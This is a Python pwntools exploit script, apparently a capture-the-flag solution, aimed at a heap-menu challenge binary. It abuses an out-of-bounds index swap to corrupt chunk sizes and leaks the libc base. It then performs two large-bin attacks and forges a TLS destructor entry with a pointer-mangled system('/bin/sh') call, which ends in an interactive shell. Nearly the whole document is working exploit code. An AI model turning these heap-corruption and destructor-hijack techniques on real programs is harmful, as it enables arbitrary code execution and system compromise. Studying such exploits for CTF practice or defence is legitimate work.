from pwn import *
from time import sleep
context.arch = 'amd64'

def debug():
        if local<2:
                gdb.attach(p,'''
                        b* __call_tls_dtors+18
                           c
                        ''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./main")
libc=ELF("./libc.so.6")
nc="nc localhost 5000"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
        p=remote(host,port)
else:
        p=process([exe.path])

############### helper functions ##############
def send():
        pass

def create(content):
        p.recvuntil("[4] replace")
        p.sendline("1")
        p.recvuntil("content : ")
        p.send(content)

def view(index):
        p.recvuntil("[4] replace")
        p.sendline("2")
        p.recvuntil("show : element index : ")
        p.sendline(str(index))

def delete(index):
        p.recvuntil("[4] replace")
        p.sendline("3")
        p.recvuntil("delete : element index : ")
        p.sendline(str(index))

def replace(index1,index2):
        p.recvuntil("[4] replace")
        p.sendline("4")
        p.recvuntil("1st element index : ")
        p.sendline(str(index1))
        p.recvuntil("2nd element index : ")
        p.sendline(str(index2))
############### main exploit    ###############


p.recvuntil("input number of elements in your tier list")
p.sendline(str(20000))

create(b"a"*8+p64(0x10760)+b"\n")  #0
create(b"a"*8+p64(0x860)+b"\n")    #1
create((p64(0)+p64(0x421))*(0x600//0x10))    #2  this for next chunk 
create((p64(0)+p64(0x421))*(0x600//0x10))    #3  this for next_next chunk 
create((p64(0)+p64(0x421))*(0x600//0x10))    #4
create(b"a"*8+p64(0x860)+b"\n")    #5
create((p64(0)+p64(0x421))*(0x600//0x10))    #6
create((p64(0)+p64(0x421))*(0x600//0x10))    #7

# for second large bin attaque
create((p64(0)+p64(0x421))*(0x600//0x10))    #5
create(b"a"*8+p64(0x860)+b"\n")    #5
create(b"a"*8+p64(0x860)+b"\n")    #5
create(b"a"*8+p64(0x860)+b"\n")    #5
create(b"a"*8+p64(0x860)+b"\n")    #5
create(b"a"*8+p64(0x860)+b"\n")    #5
create(b"a"*8+p64(0x860)+b"\n")    #5


replace(0,263010)
create(b"a"*0x5f0+p64(0)+p64(0xc01))   #6 from topchunk
#create(b"a"*0x5f0+p64(0)+b"\n")   #7 from topchunk
#create(b"a"*0x5f0+p64(0)+b"\n")   #8 from topchunk
delete(1) # deletes the chunk with modified size 0xc00
create(p64(0)+p64(0x10150)+p16(1)*0x100+b"\n") # 7 # splits the previously freed unsorted bin chunk
view(2)

p.recvuntil("element : ")
libc.address=u64(p.recv(6).ljust(8,b"\x00"))-0x1d6b20

log.info(f"libc base : {hex(libc.address)}")
target=libc.address-0x2900
log.info(f"target : {hex(target)}")
create(p16(1)*(0x5f0//2)+p64(0)+p64(0x5f0)) # takes from topchunk
create((p64(target-0x20)*2).ljust(0x5f0,b"\x00")+p64(0)+p64(0x5d1))   # from topchunk
#create((p64(0)+p64(0x421))*(0x600//0x10))   # from topchunk
payload=(p64(0)+p64(0x421))*9+p64(0)+p16(1)*4+(p64(0)+p64(0x421))*((0x600//0x10 )-10)
target_write=libc.address-0x28c0-80
payload=payload[:0x358]+p64(target_write)+payload[0x358+8:]
create(payload)   # from topchunk

#create((p16(1)*4+p64()   # from topchunk

delete(3) ## goes into unsorted bin 

## this create pushes unsorted into large bin thus first stage done 

####################################
####################################
####################################

create(b"a"*0x5f0+p64(0)+p64(0xb01))   #6 from topchunk


delete(5)
create(p64(0)+p64(0x10150)+b"\n") #  # splits the previously freed unsorted bin chunk
view(2)

create(b"f"*0x5f0+p64(0)+p64(0x4f0)) # takes from topchunk
target=libc.address+0x1d61f0-8
log.info(f"target : {hex(target)}")
create((p64(target-0x20)*2).ljust(0x5f0,b"\x00")+p64(0)+p64(0x4d1))   # from topchunk
create((p64(0)+p64(0x421))*(0x600//0x10))   # from topchunk


delete(7) ## goes into unsorted bin 

create(b"a"*0x5f0+p64(0)+p64(0xb01))   #6 from topchunk

#debug()
log.info(f"target : {hex(target_write)}")

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

payload=p64(target_write+0x10)*2
payload+=p64(rol(libc.symbols["system"],0x11,64))+p64(next(libc.search("/bin/sh")))
payload+=p64(0)*7
payload+=p64(libc.address-0x28c0)
payload+=p64(libc.address-0x1f20)
payload+=p64(libc.address-0x28c0)
payload+=p64(0)*2
payload+=p64(0)
payload+=p64(0) # canary
 # canary
create(payload+b"\n")
p.sendline("9")
'''
our struct needs to look like this rbx+8 : arg1

create [19] will have our fake tcache
'''

p.interactive()